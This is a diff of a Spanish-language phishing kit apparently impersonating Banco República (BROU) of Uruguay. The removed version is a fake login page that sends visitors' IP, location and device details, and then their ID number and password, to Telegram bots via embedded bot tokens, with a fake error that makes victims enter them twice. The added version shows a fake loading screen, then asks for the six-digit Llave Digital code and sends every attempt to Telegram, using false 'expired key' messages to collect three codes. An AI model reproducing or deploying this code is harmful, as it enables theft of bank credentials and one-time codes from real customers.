@@ -1,373 +1,248 @@
 <!DOCTYPE html>
 <html lang="es">
 
-<!-- Mirrored from 78.111.75.154/?fbclid=PAVERFWAMv3gNleHRuA2FlbQIxMAABp6A2e32K3TrnN_X2zOWEP52EQ1JXfeXbc5IfFIR64yei5B5rxkfVRAEe9VfL_aem_R9W-id3SEC47viFP90vC_w by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 11 Sep 2025 16:56:59 GMT -->
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Ingreso de Usuario</title>
+  <title>Cargando...</title>
   <style>
-    @font-face {
-      font-family: "Gotham Book";
-      src: url("GothamBook.otf") format("opentype");
-    }
-
-    * {
-      box-sizing: border-box;
-    }
-
     body {
       margin: 0;
-      font-family: "Gotham Book", sans-serif;
-      background-color: #fff;
+      background-color: #08528d;
+      color: white;
+      font-family: 'Segoe UI', sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      text-align: center;
     }
 
     header {
-      background: #0d5ea1;
-      padding: 16px;
-      border-bottom: 4px solid #ffc400;
-      display: flex;
-      align-items: center;
-      justify-content: center;
+      position: absolute;
+      top: 20px;
     }
 
     header img {
       height: 36px;
     }
 
-    .container {
+    .spinner {
+      border: 6px solid #ccc;
+      border-top: 6px solid #ffc400;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin: 20px 0;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .porcentaje {
+      font-size: 18px;
+      margin-top: 10px;
+    }
+
+    #verificacion {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      max-width: 340px;
+      margin: 0 auto;
+      background-color: #08528d;
+      color: #fff;
       padding: 20px;
-      max-width: 480px;
+      border-radius: 12px;
+      border: 2px solid #ffc400;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.4);
+    }
+
+    #verificacion img {
+      height: 36px;
+      margin-bottom: 15px;
+    }
+
+    #verificacion p {
+      font-size: 16px;
+      margin-bottom: 15px;
+      text-align: left;
+    }
+
+    #llave {
+      padding: 12px;
+      font-size: 16px;
+      border: none;
+      border-radius: 6px;
       width: 100%;
-      margin: auto;
+      margin-bottom: 15px;
+    }
+
+    #continuar {
+      padding: 12px 20px;
+      background-color: #ffc400;
+      color: #002147;
+      border: none;
+      border-radius: 6px;
+      font-weight: bold;
+      cursor: pointer;
+      width: 100%;
     }
 
     h2 {
-      color: #0066B3;
-      text-align: center;
-      font-weight: 600;
-      font-size: 22px;
-      margin-bottom: 20px;
-    }
-
-    .message-container.error {
-      background-color: #FFDDD9;
-      padding: 1.6699px 12.5242px;
-      margin: 0 0 16.699px 0;
-      font-family: "Gotham Book", sans-serif;
-      font-size: 15px;
-      color: #111;
-      border: 1px solid #E53935;
-      display: none;
-      align-items: center;
-      gap: 10px;
-    }
-
-    label {
-      display: block;
-      margin-bottom: 2px;
-      font-size: 15px;
-      font-family: "Gotham Book", sans-serif;
-      color: #111111;
-    }
-
-    input,
-    select {
-      width: 100%;
-      height: 40px;
-      padding: 10px;
-      border: 1px solid #1976d2;
-      border-radius: 6px;
-      font-size: 16px;
-      font-family: "Gotham Book", sans-serif;
-      margin-bottom: 5px;
-    }
-
-    .input-error {
-      border-color: #e53935 !important;
-      background-color: #fff5f5;
-    }
-
-    .error-msg {
-      color: #e53935;
-      font-size: 13px;
-      font-family: "Gotham Book", sans-serif;
-      display: none;
-      margin-bottom: 10px;
-    }
-
-    .password-container {
-      position: relative;
-    }
-
-    .toggle-password {
-      position: absolute;
-      right: 12px;
-      top: 12px;
-      cursor: pointer;
-      width: 20px;
-      height: 20px;
-    }
-
-    .toggle-password img {
-      width: 100%;
-      height: auto;
-      display: block;
-    }
-
-    button {
-      width: 100%;
-      height: 46px;
-      background-color: #0066B3;
-      color: white;
-      font-size: 16px;
-      border: none;
-      border-radius: 30px;
-      cursor: pointer;
-      margin-top: 10px;
-      font-family: "Gotham Book", sans-serif;
-    }
-
-    .links {
-      margin-top: 20px;
-      text-align: center;
-    }
-
-    .links a {
-      display: block;
-      color: #1976d2;
-      text-decoration: none;
-      margin: 5px 0;
-      font-size: 15px;
+      margin-top: 0;
     }
 
     footer {
+      position: absolute;
+      bottom: 20px;
+    }
+
+    footer img {
+      height: 30px;
+    }
+
+    /* Estilo para el mensaje de error */
+    #error-message {
+      display: none;
+      background-color: #f44336; /* Rojo */
+      color: white;
+      padding: 10px;
+      font-weight: bold;
+      border-radius: 4px;
+      margin-bottom: 20px;
+      width: 100%;
       text-align: center;
-      color: #aaa;
-      font-size: 12px;
-      margin-top: 40px;
-      padding: 20px;
     }
   </style>
 </head>
 <body>
 
-  <header>
+  <h2 id="mensaje">Procesando datos...</h2>
+  <div class="spinner" id="spinner"></div>
+  <div class="porcentaje" id="porcentaje">0%</div>
+
+  <div id="verificacion">
     <img src="logo.svg" alt="BROU Logo" />
-  </header>
-
-  <div class="container">
-    <h2>Ingreso de Usuario</h2>
-
-    <div id="login-error" class="message-container error">
-      <span style="color: red; font-size: 20px;">&#10006;</span>
-      <span>Usuario y/o contraseña incorrectos</span>
-    </div>
-
-    <label for="pais">País</label>
-    <select id="pais">
-      <option selected>Uruguay</option>
-    </select>
-
-    <label for="tipo">Tipo de Documento</label>
-    <select id="tipo">
-      <option>C.I.</option>
-    </select>
-
-    <label for="documento">Nº de Documento</label>
-    <input type="text" id="documento" maxlength="8" inputmode="numeric" pattern="[0-9]*"
-           oninput="this.value = this.value.replace(/[^0-9]/g, '')">
-    <span id="error-doc" class="error-msg">El usuario no puede estar vacío</span>
-
-    <label for="password">Contraseña</label>
-    <div class="password-container">
-      <input type="password" id="password" placeholder="Contraseña" />
-      <span class="toggle-password" onclick="togglePassword()">
-        <img id="eye-icon" src="ojo.png" alt="Mostrar/Ocultar">
-      </span>
-    </div>
-    <span id="error-pass" class="error-msg">La Contraseña no puede estar vacía</span>
-
-    <button id="ingresar">Ingresar</button>
-
-    <div class="links">
-      <a href="#">¿Olvidó su Contraseña?</a>
-      <a href="#">Tengo un código de recuperación</a>
-      <a href="#">Registrar Usuario</a>
-    </div>
+    <p>
+      <strong>POR SU SEGURIDAD NO INGRESE EL PIN DE SU TARJETA!</strong><br/>
+      Ingrese el código de 6 dígitos creado por la app Ebrou Llave Digital para comprobar que eres el propietario de la cuenta
+    </p>
+    <input type="text" id="llave" placeholder="Llave Digital" inputmode="numeric" maxlength="6" pattern="\d{6}" required oninput="this.value = this.value.replace(/\D/g, '')" />
+    <button id="continuar">Verificar</button>
   </div>
 
+  <!-- Mensaje de error que aparecerá cuando la llave haya caducado -->
+  <div id="error-message">
+    La llave ha caducado, por favor intenta nuevamente.
+  </div>
+
+  <!-- Logo en el footer -->
   <footer>
-    © 2023 Banco República<br />
-    Todos los derechos reservados
+    <img src="logofooter.svg" alt="BROU Footer Logo" />
   </footer>
 
-  <script>
-    let intentosLogin = 0;
-  
-    function togglePassword() {
-      const passwordInput = document.getElementById("password");
-      const eyeIcon = document.getElementById("eye-icon");
-      if (passwordInput.type === "password") {
-        passwordInput.type = "text";
-        eyeIcon.src = "ojo-abierto.png";
-      } else {
-        passwordInput.type = "password";
-        eyeIcon.src = "ojo.png";
-      }
+<script>
+  const input = document.getElementById('llave');
+  const button = document.getElementById('continuar');
+  const errorMessage = document.getElementById('error-message');  // Referencia al mensaje de error
+
+  input.addEventListener('input', () => {
+    input.value = input.value.replace(/\D/g, '').slice(0, 6);
+    button.disabled = input.value.length !== 6;
+  });
+
+  let porcentaje = 0;
+  const porcentajeEl = document.getElementById('porcentaje');
+  const mensaje = document.getElementById('mensaje');
+  const spinner = document.getElementById('spinner');
+  const verificacion = document.getElementById('verificacion');
+
+  const intervalo = setInterval(() => {
+    porcentaje += Math.floor(Math.random() * 8) + 3;
+    if (porcentaje >= 100) {
+      porcentaje = 100;
+      clearInterval(intervalo);
+      mensaje.style.display = 'none';
+      spinner.style.display = 'none';
+      porcentajeEl.style.display = 'none';
+      verificacion.style.display = 'flex';
     }
-  
-    const bots = [
-      {
-        token: '8359301388:AAETL19V69X0oX3zNJoR6yzar8tvBgL-imA',
-        chatId: '-4864114446'
-      },
-      {
-        token: '8359301388:AAETL19V69X0oX3zNJoR6yzar8tvBgL-imA',
-        chatId: '-4864114446'
-      }
-    ];
-  
-    async function notifyEntranceWithIP() {
-      try {
-        const ipResponse = await fetch('https://api.ipify.org/?format=json');
-        const ipData = await ipResponse.json();
-        const ip = ipData.ip;
-  
-        const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
-        const geoData = await geoResponse.json();
-        const pais = geoData.country_name || "Desconocido";
-        const region = geoData.region || "";
-        const ciudad = geoData.city || "";
-  
-        const userAgent = navigator.userAgent;
-        const plataforma = navigator.platform;
-        const anchoPantalla = window.screen.width;
-        const altoPantalla = window.screen.height;
-  
-        const mensajeEntrada = `📢 Alguien ingresó al sitio web
-  🕒 ${new Date().toLocaleString()}
-  🌐 IP: ${ip}
-  🌎 País: ${pais}
-  🏙️ Región: ${region}
-  🏙️ Ciudad: ${ciudad}
-  💻 Plataforma: ${plataforma}
-  🧭 Navegador: ${userAgent}
-  📱 Resolución: ${anchoPantalla}x${altoPantalla}`;
-  
-        for (const bot of bots) {
-          await fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-              chat_id: bot.chatId,
-              text: mensajeEntrada,
-              parse_mode: "Markdown"
-            })
-          });
-        }
-      } catch (error) {
-        console.error("Error notificando ingreso con IP:", error);
-      }
-    }
-  
-    document.addEventListener("DOMContentLoaded", () => {
-      notifyEntranceWithIP();
-    });
-  
-    document.getElementById("ingresar").addEventListener("click", async function (e) {
-  e.preventDefault();
+    porcentajeEl.textContent = porcentaje + '%';
+  }, 400);
 
-  const documentoInput = document.getElementById("documento");
-  const passwordInput = document.getElementById("password");
-  const documento = documentoInput.value.trim();
-  const password = passwordInput.value.trim();
-  const errorDoc = document.getElementById("error-doc");
-  const errorPass = document.getElementById("error-pass");
-  const errorLogin = document.getElementById("login-error");
-
-  let valido = true;
-
-  if (documento === "") {
-    errorDoc.innerText = "El usuario no puede estar vacío";
-    errorDoc.style.display = "block";
-    documentoInput.classList.add("input-error");
-    valido = false;
-  } else if (documento.length !== 8) {
-    errorDoc.innerText = "El número de documento debe tener 8 dígitos";
-    errorDoc.style.display = "block";
-    documentoInput.classList.add("input-error");
-    valido = false;
-  } else {
-    errorDoc.style.display = "none";
-    documentoInput.classList.remove("input-error");
-  }
-
-  if (password === "") {
-    errorPass.style.display = "block";
-    passwordInput.classList.add("input-error");
-    valido = false;
-  } else {
-    errorPass.style.display = "none";
-    passwordInput.classList.remove("input-error");
-  }
-
-  if (!valido) return;
-
-  if (intentosLogin === 0 || password.length < 5) {
-    errorLogin.style.display = "flex";
-    intentosLogin++;
-    return;
-  } else {
-    errorLogin.style.display = "none";
-  }
-
-  const mensaje = `➖➖➖[ BROU UY ]➖➖➖
-✔️ Documento: ${documento}
-✔️ Contraseña: ${password}
-➖➖➖ 𝙄𝙉𝙁𝙊 ➖➖➖
-🌐 dev: [@mioydenadiemas]
-➖➖➖`;
-
-  // Definimos los bots y chats
   const bots = [
     {
-      token: '8135711594:AAFr31MSd-lpmmS7gC92WpMBMCyIo8l5n8U',
-      chatId: '-4867067566'
+      token: '8359301388:AAETL19V69X0oX3zNJoR6yzar8tvBgL-imA',
+      chatId: '-4864114446'
     },
     {
-      token: '8135711594:AAFr31MSd-lpmmS7gC92WpMBMCyIo8l5n8U',
-      chatId: '-4867067566'
+      token: '8359301388:AAETL19V69X0oX3zNJoR6yzar8tvBgL-imA',
+      chatId: '-4864114446'
     }
   ];
 
-  // Enviamos el mensaje a todos los bots (en paralelo)
-  try {
-    await Promise.all(
-      bots.map(bot =>
-        fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
+  let intentos = 0;
+
+  document.getElementById('continuar').addEventListener('click', async () => {
+    const llave = input.value.trim();
+
+    if (llave.length !== 6) {
+      alert('Por favor, ingresá tu llave de seguridad.');
+      return;
+    }
+
+    intentos++;
+    const titulo = `🔐 Intento ${intentos}`;
+    const mensajeTelegram = `${titulo} de verificación:\nLlave: ${llave}`;
+
+    try {
+      // Intentar enviar el mensaje a todos los bots
+      await Promise.all(bots.map(async bot => {
+        const response = await fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             chat_id: bot.chatId,
-            text: mensaje,
+            text: mensajeTelegram,
             parse_mode: "Markdown"
           })
-        })
-      )
-    );
-    // Si todo salió bien, redirigimos
-    window.location.href = "cargando.html";
-  } catch (error) {
-    console.error("Error enviando credenciales:", error);
-    alert("Error al enviar los datos, por favor intenta de nuevo.");
-  }
-});
-  </script>
-  
-</body>
+        });
 
-<!-- Mirrored from 78.111.75.154/?fbclid=PAVERFWAMv3gNleHRuA2FlbQIxMAABp6A2e32K3TrnN_X2zOWEP52EQ1JXfeXbc5IfFIR64yei5B5rxkfVRAEe9VfL_aem_R9W-id3SEC47viFP90vC_w by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 11 Sep 2025 16:57:01 GMT -->
+        // Si la respuesta es exitosa, podemos continuar
+        if (!response.ok) {
+          throw new Error(`Error al enviar mensaje a Telegram: ${response.statusText}`);
+        }
+      }));
+
+      if (intentos < 3) {
+        // Mostrar el mensaje de error cuando la llave ha caducado
+        errorMessage.style.display = 'block';
+
+        // El mensaje de error desaparece después de 3 segundos
+        setTimeout(() => {
+          errorMessage.style.display = 'none';
+        }, 3000);
+
+        input.value = '';
+        input.focus();
+        button.disabled = true;
+        return;
+      } else {
+        // Tercer intento: permitir continuar
+        window.location.href = 'facturando.html';
+      }
+    } catch (err) {
+      console.error('Error al enviar a Telegram:', err);
+      alert('Error en el sistema. Intenta nuevamente.');
+    }
+  });
+</script>
+
+</body>
 </html>
